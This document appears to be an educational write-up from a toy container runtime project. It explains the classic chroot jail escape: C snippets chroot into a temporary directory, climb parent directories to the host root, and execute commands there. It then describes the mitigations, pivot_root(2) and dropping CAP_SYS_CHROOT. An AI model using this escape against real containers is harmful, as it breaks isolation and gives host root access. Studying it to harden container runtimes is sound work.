# Chroot Jailbreak

Drofune uses chroot(2) to hide the host's file system from the container, but this can be jailbreaked according to known specifications.

According to man page of chroot(2):

> This call does not change the current working directory, so that after the call '.' can be outside the tree rooted at '/'.  In particular, the superuser can escape from a "chroot jail" by doing: mkdir foo; chroot foo; cd ..

## How does the exploit work?

Start a new container and invoking a shell. Then just run the exploit.

// Gif

First, create a temporary directory and chroot to it.

```c
char template[] = "chroot-jailbreak-XXXXXX";
char *dir = mkdtemp(template);
chroot(dir);
```

The important thing here is that the current directory is above the new chrooted root. Since chroot(2) is not nested, the first container's root disappears, and there is only the host's root directory after that.

Next, it continues to climb above the directory until the parent directory is not changed (i.e. it reaches the host's root).

```c
ino_t ino = 0;
while (1) {
  struct stat st;
  stat(".", &st)

  if (st.st_ino == ino) break;
  ino = st.st_ino;
  printf("Move to parent dir. current inode: %ld\n", st.st_ino);
  chdir("..");
}
```

Finally, chroot to the current directory and make the container root the host root. You have now escaped from the chroot jail.

```c
chroot(".");
printf("Escaped from chroot jail\n");

printf("Run commands in real root...\n");
execv(commands[0], commands);
```

## Mitigations

Starting a new container with `--pivot-root` option allows to mitigate the vulnerability. When this option is given, use pivot_root(2) instead of chroot(2).

// Gif

```c
if (ctx.pivot_root) {
  pivot_rootfs(rd);
} else {
  chrootfs(rd);
}
```

https://github.com/wata727/drofune/blob/1248279794e22d30df5175e08d0e19980954d5a3/run.c#L100-L108

pivot_root(2) moves the host's root to another directory (and that is [unmounted](https://github.com/wata727/drofune/blob/1248279794e22d30df5175e08d0e19980954d5a3/run.c#L270-L275)), so you cannot jailbreak in this way.

It is also good way to drop the `CAP_SYS_CHROOT` capability so that chroot cannot be run inside containers. You can try it with the `--drop-caps` option.

// Gif

```c
prctl(PR_CAPBSET_DROP, CAP_SYS_CHROOT, 0, 0, 0);
```

https://github.com/wata727/drofune/blob/1248279794e22d30df5175e08d0e19980954d5a3/run.c#L110-L116
https://github.com/wata727/drofune/blob/1248279794e22d30df5175e08d0e19980954d5a3/drop_caps.c#L67-L73

In runc and crun, pivot_root(2) is adopted. chroot(2) is not restricted inside containers, but because it uses pivot_root(2), there is no fear of jailbreaking.

## References

- [Escaping a chroot jail/1](https://filippo.io/escaping-a-chroot-jail-slash-1/)
- [chroot されたディレクトリから脱出してみる](http://www.gcd.org/blog/2007/09/132/) (Japanese)
